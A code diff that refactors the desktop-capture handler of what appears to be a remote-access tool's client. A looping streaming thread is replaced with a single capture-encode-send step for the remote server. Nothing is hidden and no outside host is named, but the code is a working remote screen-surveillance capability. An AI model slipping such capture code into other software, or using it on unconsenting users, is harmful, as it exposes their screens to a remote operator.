@@ -16,16 +16,6 @@ namespace xClient.Core.Commands
     {
         public static void HandleGetDesktop(Packets.ServerPackets.GetDesktop command, Client client)
         {
-            if (command.Action == RemoteDesktopAction.Stop)
-            {
-                IsStreamingDesktop = false;
-                return;
-            }
-
-            if (IsStreamingDesktop) return;
-
-            IsStreamingDesktop = true;
-
             var resolution = FormatHelper.FormatScreenResolution(ScreenHelper.GetBounds(command.Monitor));
 
             if (StreamCodec == null)
@@ -40,64 +30,44 @@ namespace xClient.Core.Commands
                 StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
             }
 
-            new Thread(() =>
+            BitmapData desktopData = null;
+            Bitmap desktop = null;
+            try
             {
-                while (IsStreamingDesktop)
+                desktop = ScreenHelper.CaptureScreen(command.Monitor);
+                desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
+                    ImageLockMode.ReadWrite, desktop.PixelFormat);
+
+                using (MemoryStream stream = new MemoryStream())
                 {
-                    if (!Program.ConnectClient.Connected) // disconnected
-                    {
-                        IsStreamingDesktop = false;
-                        return;
-                    }
-
-                    // check screen resolution while streaming remote desktop
-                    resolution = FormatHelper.FormatScreenResolution(ScreenHelper.GetBounds(command.Monitor));
-                    if (StreamCodec != null && StreamCodec.Resolution != resolution)
-                    {
-                        StreamCodec.Dispose();
-                        StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
-                    }
-
-                    BitmapData desktopData = null;
-                    Bitmap desktop = null;
-                    try
-                    {
-                        desktop = ScreenHelper.CaptureScreen(command.Monitor);
-                        desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
-                            ImageLockMode.ReadWrite, desktop.PixelFormat);
-
-                        using (MemoryStream stream = new MemoryStream())
-                        {
-                            if (StreamCodec == null) throw new Exception("StreamCodec can not be null.");
-                            StreamCodec.CodeImage(desktopData.Scan0,
-                                new Rectangle(0, 0, desktop.Width, desktop.Height),
-                                new Size(desktop.Width, desktop.Height),
-                                desktop.PixelFormat, stream);
-                            new Packets.ClientPackets.GetDesktopResponse(stream.ToArray(), StreamCodec.ImageQuality,
-                                StreamCodec.Monitor, StreamCodec.Resolution).Execute(client);
-                        }
-                    }
-                    catch (Exception)
-                    {
-                        if (StreamCodec != null)
-                            new Packets.ClientPackets.GetDesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor,
-                                StreamCodec.Resolution).Execute(client);
-
-                        StreamCodec = null;
-                    }
-                    finally
-                    {
-                        if (desktop != null)
-                        {
-                            if (desktopData != null)
-                            {
-                                desktop.UnlockBits(desktopData);
-                            }
-                            desktop.Dispose();
-                        }
-                    }
+                    if (StreamCodec == null) throw new Exception("StreamCodec can not be null.");
+                    StreamCodec.CodeImage(desktopData.Scan0,
+                        new Rectangle(0, 0, desktop.Width, desktop.Height),
+                        new Size(desktop.Width, desktop.Height),
+                        desktop.PixelFormat, stream);
+                    new Packets.ClientPackets.GetDesktopResponse(stream.ToArray(), StreamCodec.ImageQuality,
+                        StreamCodec.Monitor, StreamCodec.Resolution).Execute(client);
                 }
-            }).Start();
+            }
+            catch (Exception)
+            {
+                if (StreamCodec != null)
+                    new Packets.ClientPackets.GetDesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor,
+                        StreamCodec.Resolution).Execute(client);
+
+                StreamCodec = null;
+            }
+            finally
+            {
+                if (desktop != null)
+                {
+                    if (desktopData != null)
+                    {
+                        desktop.UnlockBits(desktopData);
+                    }
+                    desktop.Dispose();
+                }
+            }
         }
 
         public static void HandleDoMouseEvent(Packets.ServerPackets.DoMouseEvent command, Client client)
